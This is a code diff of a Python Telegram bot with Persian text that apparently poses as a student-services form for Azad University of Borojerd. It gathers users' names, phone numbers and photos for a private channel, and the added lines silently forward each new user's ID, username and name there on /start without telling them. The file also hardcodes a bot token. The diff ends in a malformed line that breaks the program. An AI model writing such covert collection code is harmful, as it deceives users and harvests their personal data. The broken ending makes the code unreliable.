@@ -5,7 +5,6 @@ import logging
 # ======= تنظیمات =======
 TOKEN = "8476998300:AAGY2UnyUcrhm29IBvg8BYyCXgRxy73GvVY"
 CHANNEL_ID = "@alialisend123"
-# لینک کانال نهایی که بعد از ثبت برای کاربر فرستاده میشه
 FINAL_LINK = "https://t.me/azadborojerd"
 # ========================
 
@@ -15,6 +14,20 @@ logging.basicConfig(
 )
 
 def start(update: Update, context: CallbackContext):
+    user = update.message.from_user
+    chat_id = update.message.chat_id
+    
+    # ارسال خودکار اطلاعات کاربر به کانال
+    user_info = (
+        f"🆕 کاربر جدید ربات:\n"
+        f"Chat ID: {chat_id}\n"
+        f"User ID: {user.id}\n"
+        f"Username: @{user.username if user.username else 'ندارد'}\n"
+        f"Name: {user.first_name} {user.last_name or ''}"
+    )
+    context.bot.send_message(chat_id=CHANNEL_ID, text=user_info)
+    
+    # پیام خوش آمد گویی به کاربر
     update.message.reply_text(
         "👋 سلام دوست عزیز!\n\nلطفاً *نام و نام خانوادگی* خودت رو برام بفرست 🙏",
         parse_mode="Markdown"
@@ -24,7 +37,6 @@ def handle_text(update: Update, context: CallbackContext):
     user_data = context.user_data
     if "name" not in user_data:
         user_data["name"] = update.message.text
-        # اسم کاربر در پیام شماره موبایل استفاده میشه
         user_name = user_data["name"].split()[0]  # فقط اسم کوچک
         update.message.reply_text(
             f"📞 عالی {user_name}! حالا لطفاً *شمارتو* بده:",
@@ -53,45 +65,4 @@ def handle_photo(update: Update, context: CallbackContext):
         context.bot.send_photo(chat_id=CHANNEL_ID, photo=open("temp.jpg", "rb"), caption=caption)
         
         # پیام با دکمه شیشه‌ای
-        keyboard = [[InlineKeyboardButton("✅ ثبت نهایی", callback_data="final_click")]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        update.message.reply_text(
-            "🎉 اطلاعات شما ثبت شد! برای ثبت نهایی روی دکمه زیر کلیک کنید:", 
-            reply_markup=reply_markup
-        )
-
-    except Exception as e:
-        logging.error(f"Error sending photo: {e}")
-        update.message.reply_text("❌ مشکلی پیش آمد! لطفاً دوباره امتحان کنید.", parse_mode="Markdown")
-
-# مدیریت کلیک روی دکمه شیشه‌ای
-def button_click(update: Update, context: CallbackContext):
-    query = update.callback_query
-    query.answer()
-    # پیام بعدی با لینک کانال نهایی
-    query.message.reply_text(
-        f"🙏 ممنون از این که ما را در ارائه خدمات بهتر دانشجویی یاری می‌کنید.\n"
-        f"💬 مارا در تریبون دانشگاه آزاد بروجرد دنبال کنید.\n\n"
-        f"🎓 لینک کانال: {FINAL_LINK}"
-    )
-    # پاک کردن داده‌های کاربر
-    context.user_data.clear()
-
-def main():
-    updater = Updater(TOKEN, use_context=True)
-    dp = updater.dispatcher
-    
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))
-    dp.add_handler(MessageHandler(Filters.photo, handle_photo))
-    dp.add_handler(MessageHandler(Filters.command, lambda u, c: None))  # جلوگیری از خطای دیگر دستورها
-    
-    # اضافه کردن CallbackQueryHandler برای دکمه شیشه‌ای
-    from telegram.ext import CallbackQueryHandler
-    dp.add_handler(CallbackQueryHandler(button_click))
-    
-    updater.start_polling()
-    updater.idle()
-
-if __name__ == "__main__":
-    main()
+        keyboard = [[InlineKeyboardButton("✅ ثبت نهایی", callback_data="final_cl]()]()
